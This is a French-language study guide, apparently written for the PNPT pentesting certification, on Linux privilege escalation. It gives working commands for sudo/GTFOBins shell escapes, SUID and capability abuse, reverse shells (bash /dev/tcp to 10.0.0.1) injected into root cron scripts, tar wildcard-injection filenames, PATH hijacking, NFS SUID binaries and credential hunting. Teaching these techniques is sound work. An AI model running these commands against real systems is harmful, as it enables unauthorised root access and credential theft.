---
title: "Privilege Escalation - Linux (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, privesc, linux, pnpt]
date: "2026-05-18"
---

# Privilege Escalation — Linux

Obtenir un shell `www-data` ou `nobody`, c'est une chose. Devenir root, c'est ce qui débloque le reste : lire `/etc/shadow`, dumper la mémoire, pivoter en tant que root sur d'autres machines. Le privesc Linux est largement une affaire de misconfiguration : permissions trop larges, scripts mal écrits, binaires SUID oubliés.

## Arbre de décision

```
   Shell utilisateur obtenu
            │
            ▼
   ┌─────────────────────┐
   │ 1. sudo -l          │ → autorisé sans mdp ? → GTFOBins direct
   └──────────┬──────────┘
              ▼
   ┌─────────────────────┐
   │ 2. SUID binaries    │ → find / -perm -4000 → GTFOBins
   └──────────┬──────────┘
              ▼
   ┌─────────────────────┐
   │ 3. Capabilities     │ → getcap -r / → setuid cap = root
   └──────────┬──────────┘
              ▼
   ┌─────────────────────┐
   │ 4. Cron jobs        │ → script root writable ? → cron en mode root
   └──────────┬──────────┘
              ▼
   ┌─────────────────────┐
   │ 5. Fichiers / NFS   │ → shadow lisible ? exports vulnérable ?
   └──────────┬──────────┘
              ▼
   ┌─────────────────────┐
   │ 6. Kernel exploits  │ → dernier recours, risque de crash
   └─────────────────────┘
```

**Règle d'or** : essayer dans l'ordre. Un `sudo -l` qui retourne une commande GTFOBins fait gagner trois heures par rapport à un kernel exploit.

## Outils d'énumération automatique

À lancer en premier réflexe — ils font la liste, à toi de comprendre et d'exploiter.

```bash
# LinPEAS — le standard
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Versions locales (à uploader sur la cible)
./linpeas.sh
./LinEnum.sh
./linux-exploit-suggester.sh        # cible les CVE kernel
```

LinPEAS code en couleur : rouge = chemin de privesc probable, jaune = à investiguer. Toujours grep `[+]` dans la sortie.

## Sudo

Le vecteur le plus simple — et étonnamment fréquent. Si l'admin a accordé sudo sur une commande puissante, GTFOBins liste comment l'exploiter.

```bash
sudo -l                                # commandes que je peux lancer en sudo
```

```
Exemple de sortie révélatrice :

User alice may run the following commands on victim:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
                ^^^^^^^                ^^^^^^^^
                pas de mot de passe    vim est exécutable en root
```

```bash
# Exploitation via GTFOBins (https://gtfobins.github.io/)
sudo vim -c '!/bin/bash'
sudo find / -exec /bin/bash \;
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/hostname        # puis :!bash
sudo nano                       # ^R^X puis "reset; bash 1>&0 2>&0"
```

**GTFOBins** est la référence absolue — pour chaque binaire courant, il liste comment l'exploiter via sudo, SUID, capabilities, file write, etc.

## SUID binaries

Un binaire avec le bit SUID s'exécute avec les droits de son propriétaire. Si propriétaire = root, alors exécution en root — il suffit de trouver une fonctionnalité du binaire qui exécute du code arbitraire.

```bash
find / -perm -4000 -type f 2>/dev/null

# Exemple de sortie :
# /usr/bin/passwd                ← normal, attendu
# /usr/bin/sudo                  ← normal
# /usr/local/bin/backup.sh       ← suspect, à investiguer
# /usr/bin/python3               ← jackpot, GTFOBins
```

```bash
# Exemples d'exploitation SUID
/usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
# Le -p empêche bash de drop les privs effectifs
```

**Subtilité** : `bash` sans `-p` reset les EUID à RUID, perdant le bénéfice du SUID. Toujours `bash -p` ou `sh -p`.

## Capabilities

Les capabilities sont un système plus granulaire que SUID. Au lieu de "tout pouvoir en root", on accorde une capacité précise (par exemple `cap_setuid` = peut changer son UID).

```bash
getcap -r / 2>/dev/null

# Exemple :
# /usr/bin/python3 = cap_setuid+ep
```

```bash
# Si python3 a cap_setuid :
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# Si tar a cap_dac_read_search :
# → peut lire tous les fichiers même sans droits, dump SAM-équivalent
```

## Cron jobs

Cron exécute des scripts à intervalles réguliers, souvent en root. Si un script root est modifiable par notre user → on injecte notre code.

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.{daily,hourly,monthly,weekly}/
crontab -l                          # crontab de l'user courant
```

```bash
# Si /etc/crontab dit :
# * * * * * root /opt/backup.sh
# Et que /opt/backup.sh est writable par notre groupe :
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /opt/backup.sh
# Listener prêt, attendre la minute
```

## Wildcard injection

Quand un script root utilise un wildcard (`*`), on peut faire passer un nom de fichier pour une option.

```bash
# Si un cron fait : tar czf /backup/all.tar.gz *
# Dans le répertoire concerné, on crée :
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > shell.sh

# Quand tar va lister, il prend ces "fichiers" pour des options → exécute shell.sh en root
```

Marche aussi avec `chown`, `chmod`, `rsync`, et beaucoup d'autres.

## PATH hijacking

Si un binaire SUID/root appelle une commande sans chemin absolu (`ls` au lieu de `/bin/ls`), on peut placer un fake `ls` au début du PATH.

```bash
# Si /usr/local/bin/backup contient un appel à "tar" sans chemin absolu
echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup           # va exécuter notre /tmp/tar au lieu de /usr/bin/tar
```

## Fichiers sensibles

```bash
# Mots de passe en clair dans des configs
grep -ri "password" /home /opt /var 2>/dev/null | grep -v '#'
grep -ri "passwd" /etc/ 2>/dev/null

# Sauvegardes oubliées
find / \( -name "*.bak" -o -name "*.old" -o -name "*.swp" \) 2>/dev/null

# Clés SSH (souvent en clair, parfois passphrase)
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# /etc/shadow accidentellement lisible
cat /etc/shadow      # si on peut, c'est privesc immédiat via hashcat
```

## NFS no_root_squash

Sur un share NFS exporté avec `no_root_squash`, le client root est respecté comme root local sur le serveur. Donc on monte chez nous, on crée un binaire SUID-root, et on l'exécute depuis la cible.

```bash
# Côté cible — vérifier
cat /etc/exports        # chercher "no_root_squash"
showmount -e localhost

# Depuis l'attaquant — monter
sudo mkdir /mnt/cible
sudo mount -t nfs CIBLE_IP:/share /mnt/cible

# Créer un binaire SUID-root
sudo cp /bin/bash /mnt/cible/rootbash
sudo chmod +s /mnt/cible/rootbash
sudo chown root:root /mnt/cible/rootbash

# Sur la cible
/share/rootbash -p
# → shell root
```

## Kernel exploits

Dernier recours, parce que :
- Risque de crash kernel (cible perdue, alerte massive)
- Souvent patchés en production
- linux-exploit-suggester est plein de faux positifs

```bash
uname -a
cat /etc/os-release

# Chercher des CVE pour ce kernel
./linux-exploit-suggester.sh

# Classiques : DirtyCow (CVE-2016-5195), DirtyPipe (CVE-2022-0847), pwnkit (CVE-2021-4034)
```

**pwnkit** (CVE-2021-4034 — Polkit/pkexec) marche sur des tonnes de systèmes encore non patchés. À tester systématiquement.

## Pièges courants

- **`sudo -l` peut demander un mot de passe** : sans creds, on ne sait pas ce qu'on peut faire. Essayer avec un mot de passe trouvé ailleurs.
- **GTFOBins n'est pas magique** : la commande proposée peut être bloquée par AppArmor/SELinux. Tester d'autres variantes.
- **Cron qui ne se déclenche pas** : vérifier que cron tourne (`systemctl status cron`) et que le PATH du crontab inclut tes binaires.
- **NFS no_root_squash sur Linux récent** : depuis Debian 11+, le default est `root_squash`. Le vecteur reste valable seulement si explicitement désactivé.
- **Kernel exploits + binaire mal compilé** = panic kernel. Compiler sur une VM avec exactement la même version de glibc que la cible.
- **Capabilities affichées par `getcap` peuvent ignorer les ambient/inheritable** : utiliser `getpcaps <PID>` sur un processus en cours pour les vraies capabilities effectives.
- **`/bin/sh` n'est pas toujours bash** sur Linux moderne (souvent `dash`). Certains payloads bash-spécifiques échouent — utiliser `bash -c` explicitement.
